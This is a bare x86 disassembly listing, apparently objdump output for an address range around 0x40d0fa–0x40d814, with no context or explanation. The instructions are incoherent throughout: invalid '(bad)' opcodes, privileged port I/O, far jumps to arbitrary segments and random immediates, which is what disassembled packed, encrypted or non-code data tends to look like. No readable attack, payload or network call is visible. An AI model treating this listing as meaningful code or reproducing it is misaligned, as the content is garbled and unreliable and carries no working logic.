  40d0fa:	mov    BYTE PTR [edx+0x24e10eed],ah
  40d100:	or     al,0x22
  40d102:	rcl    BYTE PTR [edx],1
  40d104:	fisttp QWORD PTR [edi-0x76]
  40d107:	cmovne ebp,DWORD PTR [edx-0x18]
  40d10b:	push   es
  40d10c:	sbb    esi,esi
  40d10e:	neg    DWORD PTR [ecx-0x6214447]
  40d114:	dec    DWORD PTR [ecx]
  40d116:	jnp    0x40d107
  40d118:	daa    
  40d119:	xor    al,0x61
  40d11b:	shl    BYTE PTR [ebx],cl
  40d11d:	fist   WORD PTR [eax]
  40d11f:	retf   
  40d120:	ins    BYTE PTR es:[edi],dx
  40d121:	scas   eax,DWORD PTR es:[edi]
  40d122:	xor    al,0x38
  40d124:	push   0xffffffa8
  40d126:	add    ecx,ebp
  40d128:	retf   0x30c8
  40d12b:	(bad)  
  40d12c:	cmp    eax,0x9820ac5e
  40d131:	lods   al,BYTE PTR ds:[esi]
  40d132:	dec    edx
  40d133:	cwde   
  40d134:	push   0x8acc89f9
  40d139:	and    BYTE PTR [edx+0x52],0x54
  40d13d:	push   ebx
  40d13e:	pop    ecx
  40d13f:	xlat   BYTE PTR ds:[ebx]
  40d140:	std    
  40d141:	fist   WORD PTR [eax+0x5b]
  40d144:	jo     0x40d12a
  40d146:	ret    0x3bec
  40d149:	sbb    BYTE PTR [eax-0x31],ch
  40d14c:	aam    0x89
  40d14e:	dec    esp
  40d14f:	sahf   
  40d150:	aam    0xf8
  40d152:	adc    WORD PTR [edi+0x6e7e4e46],0xa3c7
  40d15b:	aad    0x17
  40d15d:	(bad)  
  40d15e:	out    dx,eax
  40d15f:	and    ebp,DWORD PTR [edi-0x3e]
  40d162:	push   esp
  40d163:	stc    
  40d164:	cmp    DWORD PTR [eax+0x34],ebp
  40d167:	enter  0xb30c,0x3e
  40d16b:	push   ds
  40d16c:	xchg   ecx,ebx
  40d16e:	inc    ebp
  40d16f:	dec    ebp
  40d170:	pop    esi
  40d171:	push   ds
  40d172:	push   0xc7a16d91
  40d177:	iret   
  40d178:	or     al,0x7
  40d17a:	ja     0x40d118
  40d17c:	add    edi,DWORD PTR [ecx+0x2e]
  40d17f:	out    0x17,al
  40d181:	xchg   esp,eax
  40d182:	les    esp,FWORD PTR [esi+0x1a3f8184]
  40d188:	fcom   QWORD PTR [edx]
  40d18a:	out    0xcc,al
  40d18c:	dec    esp
  40d18d:	mov    al,ds:0x4f2c5f64
  40d192:	imul   ecx,DWORD PTR [edi+0x6b],0xa607f60f
  40d199:	push   ecx
  40d19a:	arpl   WORD PTR [eax+0x3435dc29],bp
  40d1a0:	sbb    al,0x3
  40d1a2:	jp     0x40d1d9
  40d1a4:	rcl    BYTE PTR [edx-0x32],1
  40d1a7:	adc    al,0x62
  40d1a9:	(bad)  
  40d1aa:	mov    ch,0x2a
  40d1ac:	jo     0x40d202
  40d1ae:	adc    dh,BYTE PTR [edi-0x25]
  40d1b1:	pop    edi
  40d1b2:	scas   al,BYTE PTR es:[edi]
  40d1b3:	mov    edi,0x71e2272d
  40d1b8:	xor    DWORD PTR [eax+0x6068c689],ebp
  40d1be:	jecxz  0x40d18b
  40d1c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1c1:	jns    0x40d22a
  40d1c3:	das    
  40d1c4:	xor    ecx,DWORD PTR [ebx-0x2c36aead]
  40d1ca:	pop    ss
  40d1cb:	fnstcw WORD PTR [esi-0x1bbf6879]
  40d1d1:	into   
  40d1d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1d3:	push   ebp
  40d1d4:	test   DWORD PTR [edi+0x4b],esi
  40d1d7:	xchg   ebp,eax
  40d1d8:	syscall 
  40d1da:	xor    edi,edx
  40d1dc:	fcomp  QWORD PTR ds:0x623ee50c
  40d1e2:	test   DWORD PTR es:[ecx],ecx
  40d1e5:	add    al,0x54
  40d1e7:	pop    ebx
  40d1e8:	inc    edi
  40d1e9:	sub    BYTE PTR [ebp-0x7],dh
  40d1ec:	jbe    0x40d1e3
  40d1ee:	xor    eax,0xf20b0fa9
  40d1f3:	dec    ebp
  40d1f4:	pop    ebp
  40d1f5:	out    0xfd,al
  40d1f7:	shl    DWORD PTR [ebp+0x61be5c10],cl
  40d1fd:	pop    esp
  40d1fe:	fwait
  40d1ff:	jne    0x40d195
  40d201:	(bad)  
  40d202:	jnp    0x40d1cc
  40d204:	dec    esp
  40d205:	sub    BYTE PTR [ebx+0x3d],0x4e
  40d209:	mov    esi,0xa567f819
  40d20e:	mov    esp,0x50570366
  40d213:	iret   
  40d214:	jb     0x40d1c6
  40d216:	inc    esp
  40d217:	std    
  40d218:	notrack call ecx
  40d21b:	test   cl,ch
  40d21d:	mov    cl,0x1e
  40d21f:	arpl   WORD PTR [edi+edx*1-0x2f],dx
  40d223:	mov    ds:0xd9cd2016,eax
  40d228:	xchg   edx,eax
  40d229:	inc    ebx
  40d22a:	fisub  DWORD PTR [ebx-0x20]
  40d22d:	sbb    al,0x45
  40d22f:	pop    edi
  40d230:	pop    ebp
  40d231:	mov    dh,bh
  40d233:	jge    0x40d29f
  40d235:	pop    esp
  40d236:	loop   0x40d204
  40d238:	sub    ebx,esi
  40d23a:	mov    ch,0x28
  40d23c:	in     eax,dx
  40d23d:	push   0x11404717
  40d242:	jge    0x40d288
  40d244:	ins    BYTE PTR es:[edi],dx
  40d245:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d246:	enter  0x5e9b,0x6b
  40d24a:	xchg   ebp,ecx
  40d24c:	in     al,0x97
  40d24e:	and    BYTE PTR [esi+esi*1],al
  40d251:	in     al,0x33
  40d253:	loope  0x40d2bf
  40d255:	mov    cl,0x54
  40d257:	nop
  40d258:	xchg   ecx,eax
  40d259:	mov    bl,0xfd
  40d25b:	push   ebp
  40d25c:	sti    
  40d25d:	gs mov ebp,0xd91d12ff
  40d263:	jae    0x40d213
  40d265:	ret    0xaf48
  40d268:	inc    ebx
  40d269:	dec    edi
  40d26a:	cwde   
  40d26b:	stos   BYTE PTR es:[edi],al
  40d26c:	pushf  
  40d26d:	repnz push 0xa182793f
  40d273:	lock pop edx
  40d275:	cdq    
  40d276:	outs   dx,BYTE PTR ds:[esi]
  40d277:	mov    ds:0x55ab0b2f,al
  40d27c:	jge    0x40d2bc
  40d27e:	mov    esi,0xbb667557
  40d283:	add    al,0x9e
  40d285:	xor    BYTE PTR [ebx],cl
  40d287:	nop
  40d288:	sub    ch,bl
  40d28a:	hlt    
  40d28b:	shl    BYTE PTR [edi+0x4d542414],0xea
  40d292:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d293:	sub    edi,DWORD PTR gs:[esi+esi*8]
  40d297:	xor    al,0xa2
  40d299:	add    ebx,DWORD PTR [ebx+0x1d085552]
  40d29f:	cmovns ecx,DWORD PTR [ebp+0x25cf177e]
  40d2a6:	sti    
  40d2a7:	mov    BYTE PTR [ebx+0x4fdd0d20],bh
  40d2ad:	xlat   BYTE PTR ds:[ebx]
  40d2ae:	mov    dh,0x2
  40d2b0:	out    0xb7,eax
  40d2b2:	stos   BYTE PTR es:[edi],al
  40d2b3:	ss xchg edx,eax
  40d2b5:	jb     0x40d28a
  40d2b7:	jmp    0x7ae432c8
  40d2bc:	popa   
  40d2bd:	inc    ebx
  40d2be:	add    BYTE PTR [ebx],cl
  40d2c0:	pop    esi
  40d2c1:	sbb    BYTE PTR [si+0x58],dh
  40d2c5:	dec    edx
  40d2c6:	mov    bl,0x54
  40d2c8:	jmp    0xf5816081
  40d2cd:	enter  0xb5d4,0xda
  40d2d1:	mov    ds:0x6e84543,al
  40d2d6:	xor    cl,BYTE PTR [eax+esi*4+0x75]
  40d2da:	les    edi,FWORD PTR [edx-0x7a]
  40d2dd:	scas   eax,DWORD PTR es:[edi]
  40d2de:	mov    ecx,fs
  40d2e0:	popf   
  40d2e1:	pop    ecx
  40d2e2:	fnstsw WORD PTR [edx]
  40d2e4:	div    BYTE PTR [ebx]
  40d2e6:	add    al,0x49
  40d2e8:	aad    0xe7
  40d2ea:	dec    eax
  40d2eb:	mov    edx,0x77256377
  40d2f0:	jns    0x40d2d3
  40d2f2:	and    ecx,esp
  40d2f4:	loop   0x40d2e8
  40d2f6:	retf   
  40d2f7:	xor    al,0x45
  40d2f9:	dec    edx
  40d2fa:	scas   eax,DWORD PTR es:[edi]
  40d2fb:	xlat   BYTE PTR ds:[ebx]
  40d2fc:	addr16 mov dl,0xd9
  40d2ff:	jae    0x40d30b
  40d301:	mov    ebp,0xa28c64c1
  40d306:	cmp    DWORD PTR [ebx+esi*8-0x45],0x5a
  40d30b:	mov    ecx,0xa0a93e1e
  40d310:	ins    DWORD PTR es:[edi],dx
  40d311:	ja     0x40d2b2
  40d313:	xor    eax,0xc7028862
  40d318:	daa    
  40d319:	dec    ecx
  40d31a:	clc    
  40d31b:	rcl    ebp,0x20
  40d31e:	popa   
  40d31f:	retf   0x6475
  40d322:	sub    al,0xb8
  40d324:	pop    eax
  40d325:	int3   
  40d326:	pop    edx
  40d327:	add    DWORD PTR [edi],0xc3fb3e7c
  40d32d:	sub    al,0xc4
  40d32f:	mov    dl,0xe0
  40d331:	jo     0x40d344
  40d333:	mov    ebx,0x475474f8
  40d338:	jns    0x40d2f4
  40d33a:	lods   eax,DWORD PTR ds:[esi]
  40d33b:	daa    
  40d33c:	out    dx,eax
  40d33d:	and    eax,0x3d9141db
  40d342:	mov    WORD PTR [ecx],es
  40d344:	xor    BYTE PTR [edi+0x6b],al
  40d347:	ret    0x67cc
  40d34a:	xchg   esi,eax
  40d34b:	and    eax,0xb12ce3d1
  40d350:	dec    esp
  40d351:	jo     0x40d2e9
  40d353:	int3   
  40d354:	(bad)  
  40d355:	push   esp
  40d356:	outs   dx,BYTE PTR ds:[esi]
  40d357:	lahf   
  40d358:	dec    esi
  40d359:	les    ebx,FWORD PTR [eax+edi*1-0x1]
  40d35d:	sbb    bh,BYTE PTR [edx-0x5a]
  40d360:	adc    DWORD PTR [ebx-0x5db07b30],0xffffffcc
  40d367:	(bad)  
  40d368:	stos   DWORD PTR es:[edi],eax
  40d369:	cmp    dl,bl
  40d36b:	call   DWORD PTR [esp+ebx*4-0x1]
  40d36f:	mov    dl,0x9d
  40d371:	pop    ebp
  40d372:	sub    cl,BYTE PTR [edx+0x23517e7b]
  40d378:	imul   esp,DWORD PTR [edi-0x1648b3fd],0x3e586429
  40d382:	xor    al,0x18
  40d384:	xor    ebp,eax
  40d386:	sbb    al,0x75
  40d388:	mov    dh,0x3a
  40d38a:	jecxz  0x40d395
  40d38c:	das    
  40d38d:	mov    ah,0xb4
  40d38f:	ja     0x40d332
  40d391:	cmc    
  40d392:	pop    DWORD PTR [ecx]
  40d394:	add    ah,BYTE PTR [ebx+0x5a]
  40d397:	dec    edx
  40d398:	sub    BYTE PTR [ecx],bl
  40d39a:	dec    ebp
  40d39b:	mov    ds:0x8db6529f,eax
  40d3a0:	in     eax,dx
  40d3a1:	add    eax,0xe2c55f8b
  40d3a6:	dec    ecx
  40d3a7:	scas   eax,DWORD PTR es:[edi]
  40d3a8:	mov    dl,0x25
  40d3aa:	js     0x40d3d6
  40d3ac:	sub    BYTE PTR cs:[esi-0x2],ah
  40d3b0:	inc    esi
  40d3b1:	cmp    BYTE PTR [bx+di+0x1cba],0x9e
  40d3b7:	pop    ds
  40d3b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3b9:	mov    dh,0x30
  40d3bb:	jp     0x40d35a
  40d3bd:	les    edi,FWORD PTR [ebx-0x31]
  40d3c0:	(bad)  
  40d3c1:	ror    BYTE PTR [esi+ebp*8-0x339c6cff],cl
  40d3c8:	push   cs
  40d3c9:	repz aaa 
  40d3cb:	add    BYTE PTR [ebp+edi*8-0x70ca21],bh
  40d3d2:	dec    ebp
  40d3d3:	fstp   st(4)
  40d3d5:	jle    0x40d39e
  40d3d7:	sbb    cl,BYTE PTR [edx-0x67de34bf]
  40d3dd:	lgs    esp,FWORD PTR [edi]
  40d3e0:	test   DWORD PTR [ebp-0x666810ac],ebx
  40d3e6:	lock jecxz 0x40d438
  40d3e9:	cmp    ebp,DWORD PTR ds:[ebx]
  40d3ec:	leave  
  40d3ed:	or     eax,0xecf1eb97
  40d3f2:	loopne 0x40d3c2
  40d3f4:	or     BYTE PTR [eax],0xef
  40d3f7:	es hlt 
  40d3f9:	inc    ebp
  40d3fa:	js     0x40d45f
  40d3fc:	(bad)  
  40d3fd:	fisttp WORD PTR [edi]
  40d3ff:	imul   eax,DWORD PTR [ecx+esi*2],0x5ee4d394
  40d406:	push   ss
  40d407:	sub    DWORD PTR [edi],0xffffffe6
  40d40a:	xor    eax,DWORD PTR [ecx]
  40d40c:	add    BYTE PTR [ecx],ah
  40d40e:	nop
  40d40f:	ins    DWORD PTR es:[edi],dx
  40d410:	and    al,0xfb
  40d412:	pop    edi
  40d413:	pop    edi
  40d414:	dec    edx
  40d415:	retf   
  40d416:	jbe    0x40d446
  40d418:	jmp    0x48c:0x774f4968
  40d41f:	mov    al,ds:0xe2d0ee7f
  40d424:	lods   eax,DWORD PTR ds:[esi]
  40d425:	lods   al,BYTE PTR ds:[esi]
  40d426:	and    ch,BYTE PTR [edx+ebp*4-0x736acefe]
  40d42d:	fimul  DWORD PTR [ebx+0x4cc8c359]
  40d433:	lods   al,BYTE PTR ds:[esi]
  40d434:	pop    edx
  40d435:	popf   
  40d436:	fsub   DWORD PTR [edx+edx*1+0x96e6b6e]
  40d43d:	fadd   QWORD PTR [esi+0x36]
  40d440:	inc    edx
  40d441:	push   ebp
  40d442:	in     al,0xeb
  40d444:	lahf   
  40d445:	dec    edx
  40d446:	arpl   bp,ax
  40d448:	xor    al,0x4f
  40d44a:	repz dec ebp
  40d44c:	test   DWORD PTR [edi],edi
  40d44e:	adc    bl,0x15
  40d451:	adc    bh,BYTE PTR [ebp-0x7f6986b4]
  40d457:	jae    0x40d4bd
  40d459:	daa    
  40d45a:	call   0xbe1d30ff
  40d45f:	push   ecx
  40d460:	pop    ss
  40d461:	nop
  40d462:	add    eax,0x30bafb2e
  40d467:	adc    BYTE PTR [edx-0x47bf20f0],0x45
  40d46e:	idiv   DWORD PTR [esi+0x1]
  40d471:	mov    bl,0x3
  40d473:	inc    esi
  40d474:	loop   0x40d45c
  40d476:	jnp    0x40d46e
  40d478:	scas   eax,DWORD PTR es:[edi]
  40d479:	pop    ds
  40d47a:	and    ax,WORD PTR [edi+edx*4+0x4aea6141]
  40d482:	fadd   DWORD PTR [eax]
  40d484:	arpl   WORD PTR [ebx+0x2e20f71b],sp
  40d48a:	mov    DWORD PTR [ecx-0x3c979eba],edi
  40d490:	lea    ecx,[eax+edi*2-0x17bd935b]
  40d497:	or     bl,BYTE PTR [eax+0x19655930]
  40d49d:	mov    al,ds:0x9f4b91df
  40d4a2:	pop    eax
  40d4a3:	cmp    eax,0x2757c8f3
  40d4a8:	icebp  
  40d4a9:	cmp    BYTE PTR [ecx],dh
  40d4ab:	js     0x40d4d8
  40d4ad:	jne    0x40d47f
  40d4af:	add    BYTE PTR [esi],dl
  40d4b1:	cmp    DWORD PTR es:[ecx-0x1a70ed2b],eax
  40d4b8:	mov    ah,0x4b
  40d4ba:	or     BYTE PTR [eax],dl
  40d4bc:	add    dh,bl
  40d4be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4bf:	stos   BYTE PTR es:[edi],al
  40d4c0:	(bad)
  40d4c3:	and    al,0x4
  40d4c5:	mov    dh,0xed
  40d4c7:	push   ecx
  40d4c8:	add    ebx,edx
  40d4ca:	sti    
  40d4cb:	stos   DWORD PTR es:[edi],eax
  40d4cc:	daa    
  40d4cd:	int    0x3d
  40d4cf:	stos   DWORD PTR es:[edi],eax
  40d4d0:	cmp    esi,DWORD PTR [ebp+0x76]
  40d4d3:	push   esi
  40d4d4:	sti    
  40d4d5:	cmp    BYTE PTR [eax-0x46],ah
  40d4d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4d9:	loop   0x40d4c5
  40d4db:	mov    cl,0x57
  40d4dd:	lahf   
  40d4de:	rol    DWORD PTR [esi],0x69
  40d4e1:	stc    
  40d4e2:	jecxz  0x40d46b
  40d4e4:	je     0x40d4cb
  40d4e6:	lahf   
  40d4e7:	js     0x40d541
  40d4e9:	pushf  
  40d4ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4eb:	dec    ebx
  40d4ec:	xor    BYTE PTR [edi-0xf6a9c99],al
  40d4f2:	pushf  
  40d4f3:	js     0x40d4db
  40d4f5:	mov    DWORD PTR [eax],ecx
  40d4f7:	outs   dx,DWORD PTR ds:[esi]
  40d4f8:	dec    ebp
  40d4f9:	xchg   DWORD PTR [ebp-0x79],esp
  40d4fc:	add    DWORD PTR [edx+0x3e],0x19
  40d500:	pop    esp
  40d501:	pop    es
  40d502:	xchg   edx,eax
  40d503:	outs   dx,DWORD PTR ds:[esi]
  40d504:	out    0x3d,al
  40d506:	xchg   edx,eax
  40d507:	fndisi(8087 only) 
  40d509:	push   ds
  40d50a:	and    dh,BYTE PTR [edi+0x1ad082c3]
  40d510:	and    bh,BYTE PTR ds:0xf2c09cad
  40d516:	xor    eax,0xaee83a15
  40d51b:	imul   edx,DWORD PTR [esi-0x7715e289],0x73
  40d522:	mov    ah,0xea
  40d524:	xor    eax,0x1b0b9b88
  40d529:	lods   al,BYTE PTR fs:[esi]
  40d52b:	nop
  40d52c:	mov    bl,0xe6
  40d52e:	push   esi
  40d52f:	out    dx,al
  40d530:	or     BYTE PTR [ebx+eax*8-0x62212efe],dh
  40d537:	in     eax,dx
  40d538:	jl     0x40d54f
  40d53a:	and    DWORD PTR [edx],ebp
  40d53c:	mov    esi,0xcf49129c
  40d541:	sbb    BYTE PTR [esi+edi*4-0x3a02ce01],bl
  40d548:	xchg   esi,eax
  40d549:	imul   esi,DWORD PTR [esi-0x40],0xffffffd8
  40d54d:	jo     0x40d566
  40d54f:	add    DWORD PTR [ecx+0x3f],ebp
  40d552:	fucomi st,st(6)
  40d554:	pop    ebx
  40d555:	xor    BYTE PTR [ebp-0x2d],ah
  40d558:	add    DWORD PTR [esi-0x5b],ecx
  40d55b:	xchg   DWORD PTR [eax],esp
  40d55d:	jne    0x40d4e4
  40d55f:	cmp    dh,0xbd
  40d562:	out    0xd1,eax
  40d564:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d565:	push   edi
  40d566:	push   es
  40d567:	mov    cl,0x9a
  40d569:	adc    eax,0x61ce02e
  40d56e:	or     al,0xb3
  40d570:	add    esi,DWORD PTR [edi-0x4f]
  40d573:	xchg   edx,eax
  40d574:	jge    0x40d562
  40d576:	xchg   esi,eax
  40d577:	dec    ebp
  40d578:	jecxz  0x40d562
  40d57a:	dec    ebx
  40d57b:	rcr    BYTE PTR [ebx+0x35],cl
  40d57e:	popf   
  40d57f:	add    bh,BYTE PTR [esi-0x2a1e6b59]
  40d585:	fild   QWORD PTR [esi-0x3e]
  40d588:	ror    DWORD PTR [esi+edx*2],0x27
  40d58c:	and    esi,edi
  40d58e:	shl    DWORD PTR [esi+0x2f],0xe4
  40d592:	sbb    al,0xc1
  40d594:	push   esi
  40d595:	(bad)  
  40d596:	xchg   ebp,eax
  40d597:	push   esp
  40d598:	mov    esi,0x60720eab
  40d59d:	neg    ecx
  40d59f:	mov    ch,0x43
  40d5a1:	aas    
  40d5a2:	jmp    DWORD PTR ds:0x37413904
  40d5a8:	pop    esp
  40d5a9:	popa   
  40d5aa:	mov    cl,0xbe
  40d5ac:	push   cs
  40d5ad:	in     eax,dx
  40d5ae:	inc    eax
  40d5af:	mov    ah,0x31
  40d5b1:	(bad)  
  40d5b2:	cmc    
  40d5b3:	nop
  40d5b4:	jmp    0x21bd:0xe0d784f4
  40d5bb:	push   cs
  40d5bc:	jns    0x40d541
  40d5be:	or     bl,BYTE PTR [ebx+0x44afa330]
  40d5c4:	sti    
  40d5c5:	call   0x9b4c:0x355d7e94
  40d5cc:	(bad)  
  40d5cd:	cld    
  40d5ce:	mov    edi,0x296b77cf
  40d5d3:	mov    ebx,0xa9a44bf6
  40d5d8:	dec    ecx
  40d5d9:	xlat   BYTE PTR ds:[ebx]
  40d5da:	pop    ss
  40d5db:	mov    cl,0xd4
  40d5dd:	out    dx,al
  40d5de:	cmc    
  40d5df:	in     eax,dx
  40d5e0:	push   esi
  40d5e1:	push   ebx
  40d5e2:	or     al,0x20
  40d5e4:	test   eax,ecx
  40d5e6:	mov    WORD PTR [edi+0x73],ss
  40d5e9:	mov    ah,0x90
  40d5eb:	add    BYTE PTR [eax+0x3e],0x54
  40d5ef:	pop    edx
  40d5f0:	and    edx,DWORD PTR [eax+ebp*4-0x555b2c4e]
  40d5f7:	adc    BYTE PTR [ecx+esi*2-0x4d2e748d],dh
  40d5fe:	test   al,0xe3
  40d600:	loope  0x40d639
  40d602:	retf   
  40d603:	out    0x83,eax
  40d605:	mov    esp,0x9e127497
  40d60a:	and    DWORD PTR [ecx],ebp
  40d60c:	data16 cli 
  40d60e:	push   esp
  40d60f:	and    BYTE PTR [edx+0x4d],al
  40d612:	sahf   
  40d613:	cli    
  40d614:	lahf   
  40d615:	int    0x36
  40d617:	jo     0x40d660
  40d619:	xor    DWORD PTR [ecx],0xe32abef2
  40d61f:	pop    edx
  40d620:	sbb    eax,0x54e92fc1
  40d625:	imul   ebp,DWORD PTR [edi-0x5a2cc2da],0x1a77c2ec
  40d62f:	(bad)  
  40d630:	jmp    0x40d5b3
  40d632:	bound  ebp,QWORD PTR [eax-0x7d]
  40d635:	shl    BYTE PTR [edi],cl
  40d637:	mov    al,0x36
  40d639:	jp     0x40d654
  40d63b:	mov    eax,ds:0x479d56f4
  40d640:	dec    ebp
  40d641:	pushw  es
  40d643:	imul   ebx,DWORD PTR [edx],0xffffff8d
  40d646:	mov    edx,0xb6eb76f0
  40d64b:	mov    cs,edi
  40d64d:	out    0x47,eax
  40d64f:	les    edx,FWORD PTR [eax]
  40d651:	imul   esp,DWORD PTR [edi+0x50],0x35562760
  40d658:	dec    ecx
  40d659:	out    dx,eax
  40d65a:	jle    0x40d6d3
  40d65c:	mov    eax,ds:0xae40244e
  40d661:	inc    eax
  40d662:	mov    al,0x3
  40d665:	lods   eax,DWORD PTR ds:[esi]
  40d666:	jp     0x40d61d
  40d668:	jp     0x40d6b6
  40d66a:	stc    
  40d66b:	mov    esp,0x56efc368
  40d670:	test   DWORD PTR [ebp-0x7b2a4ccb],esi
  40d676:	add    BYTE PTR [edi-0x7c],dh
  40d679:	add    bh,dl
  40d67b:	jecxz  0x40d662
  40d67d:	jg     0x40d6e6
  40d67f:	mov    dh,0x43
  40d681:	and    al,0x50
  40d683:	pop    ebp
  40d684:	cdq    
  40d685:	leave  
  40d686:	lds    edx,FWORD PTR [ecx+ebp*4-0x5fcc1054]
  40d68d:	(bad)  
  40d68e:	cli    
  40d68f:	scas   eax,DWORD PTR es:[edi]
  40d690:	stos   DWORD PTR es:[edi],eax
  40d691:	mov    edi,0x29f040bc
  40d696:	push   cs
  40d697:	sahf   
  40d698:	adc    ebp,DWORD PTR [esi-0x8]
  40d69b:	into   
  40d69c:	inc    edi
  40d69d:	test   BYTE PTR [edi-0x3e],dl
  40d6a0:	(bad)  
  40d6a1:	mov    al,ds:0xd6a525f5
  40d6a6:	dec    ecx
  40d6a8:	sbb    eax,0x82bf885
  40d6ad:	sahf   
  40d6ae:	sub    al,bh
  40d6b0:	jns    0x40d68c
  40d6b2:	sbb    DWORD PTR [ebx+0xcd3f26],edx
  40d6b8:	out    0x77,eax
  40d6ba:	neg    DWORD PTR [esi-0x37275479]
  40d6c0:	push   cs
  40d6c1:	fidivr DWORD PTR [ebx-0x66]
  40d6c4:	jecxz  0x40d737
  40d6c6:	inc    ecx
  40d6c7:	adc    al,0x1d
  40d6c9:	data16 add ch,ah
  40d6cc:	and    esp,DWORD PTR [esi-0x7b]
  40d6cf:	sbb    BYTE PTR [ecx],bl
  40d6d1:	fwait
  40d6d2:	xchg   ebp,eax
  40d6d3:	mov    ah,0xe0
  40d6d5:	jae    0x40d6b6
  40d6d7:	add    al,0xa0
  40d6d9:	adc    BYTE PTR [edx-0x2ba6215a],0x10
  40d6e0:	push   cs
  40d6e1:	out    0x50,eax
  40d6e3:	pop    esi
  40d6e4:	out    dx,al
  40d6e5:	jge    0x40d688
  40d6e7:	(bad)  
  40d6e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6e9:	loop   0x40d737
  40d6eb:	mov    esp,0x8c547135
  40d6f0:	sbb    al,0x83
  40d6f2:	mov    ebx,0xee1f86e8
  40d6f7:	cmc    
  40d6f8:	nop
  40d6f9:	fist   WORD PTR [edi+ecx*1+0x3527b870]
  40d700:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d701:	inc    esi
  40d702:	mov    WORD PTR [eax],ds
  40d704:	pop    ebp
  40d705:	std    
  40d706:	push   0x36
  40d708:	xor    al,0x51
  40d70a:	mov    DWORD PTR [edx],edx
  40d70c:	popf   
  40d70d:	jle    0x40d69c
  40d70f:	icebp  
  40d710:	mov    ebx,0xc7a931be
  40d715:	pop    ebx
  40d716:	in     eax,dx
  40d717:	mov    esp,0x9ad7f67b
  40d71c:	frstor ds:0x3aa5b78
  40d722:	fist   WORD PTR [ecx]
  40d724:	inc    ebp
  40d725:	rcr    edi,cl
  40d727:	mov    ch,0x50
  40d729:	xchg   ah,ch
  40d72b:	mov    DWORD PTR [esi],eax
  40d72d:	pop    ds
  40d72e:	scas   al,BYTE PTR es:[edi]
  40d72f:	loope  0x40d784
  40d731:	jp     0x40d6d6
  40d733:	xchg   ebx,eax
  40d734:	sbb    ah,dl
  40d736:	or     ch,BYTE PTR [ecx+0x2c461aae]
  40d73c:	sub    al,0xbe
  40d73e:	or     BYTE PTR [eax-0x7c],ch
  40d741:	push   edx
  40d742:	loop   0x40d7a0
  40d744:	push   ecx
  40d745:	mov    ch,0xc4
  40d747:	(bad)  
  40d748:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d749:	cmp    eax,0x81a25f2d
  40d74e:	lock stos DWORD PTR es:[edi],eax
  40d750:	xchg   DWORD PTR [eax],edi
  40d752:	pop    ebp
  40d753:	cmp    eax,0xcd21d1e5
  40d758:	popa   
  40d759:	jae    0x40d781
  40d75b:	jnp    0x40d786
  40d75d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d75e:	jp     0x40d765
  40d760:	int    0x0
  40d762:	sbb    edi,esi
  40d764:	ds inc edx
  40d766:	pusha  
  40d767:	xor    al,0xc5
  40d769:	mov    eax,0xdb3434a2
  40d76e:	mov    eax,ds:0xc9f5a6b3
  40d773:	dec    ecx
  40d774:	fld    QWORD PTR [ecx]
  40d776:	aas    
  40d777:	mov    ebx,0x7882388c
  40d77c:	dec    esi
  40d77d:	(bad)  
  40d77e:	push   esi
  40d77f:	fsub   QWORD PTR [ebx]
  40d781:	mov    ebp,edi
  40d783:	outs   dx,BYTE PTR ds:[si]
  40d785:	div    BYTE PTR [edi+ebp*2]
  40d788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d789:	pop    ss
  40d78a:	retf   0x700e
  40d78d:	clc    
  40d78e:	sub    cl,ah
  40d790:	push   eax
  40d791:	dec    ecx
  40d792:	and    eax,esp
  40d794:	or     eax,0xa9df9010
  40d799:	mov    edi,DWORD PTR [edx-0x2db2d8ff]
  40d79f:	adc    al,0x66
  40d7a1:	add    al,0xe9
  40d7a3:	das    
  40d7a4:	push   ss
  40d7a5:	jg     0x40d74b
  40d7a7:	aaa    
  40d7a8:	dec    ebp
  40d7a9:	xor    BYTE PTR [ebx+0x1f],cl
  40d7ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7ad:	add    BYTE PTR [ecx+0x48b3560b],bl
  40d7b3:	sub    eax,0x6eaf9ff5
  40d7b8:	adc    DWORD PTR [ecx],esi
  40d7ba:	sahf   
  40d7bb:	js     0x40d73f
  40d7bd:	mov    al,0x82
  40d7bf:	js     0x40d80e
  40d7c1:	add    al,0x10
  40d7c3:	mov    dl,0x44
  40d7c5:	daa    
  40d7c6:	mov    DWORD PTR [esi-0x5c],ebx
  40d7c9:	dec    esi
  40d7ca:	loope  0x40d7eb
  40d7cc:	xor    eax,0x4932db2f
  40d7d1:	push   0x3b
  40d7d3:	dec    eax
  40d7d4:	cli    
  40d7d5:	in     al,0x72
  40d7d7:	call   FWORD PTR [esi-0x3b]
  40d7da:	retf   
  40d7db:	push   ecx
  40d7dc:	mov    ebx,0x12f78596
  40d7e1:	out    dx,eax
  40d7e2:	sti    
  40d7e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7e4:	jecxz  0x40d815
  40d7e6:	std    
  40d7e7:	jle    0x40d866
  40d7e9:	daa    
  40d7ea:	dec    ebx
  40d7eb:	aam    0x7f
  40d7ed:	pop    ecx
  40d7ee:	xor    eax,0x8d819d60
  40d7f3:	jnp    0x40d780
  40d7f5:	fcomp  DWORD PTR [esi-0xa]
  40d7f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7f9:	iret   
  40d7fa:	cdq    
  40d7fb:	out    dx,al
  40d7fc:	push   ss
  40d7fd:	pusha  
  40d7fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7ff:	popaw  
  40d801:	mov    ds:0xfb9012e,eax
  40d806:	shl    DWORD PTR [eax],cl
  40d808:	and    eax,0xf728ec4b
  40d80d:	jmp    0x7419a4c1
  40d812:	std    
  40d813:	push   es
  40d814:	dec    ebx
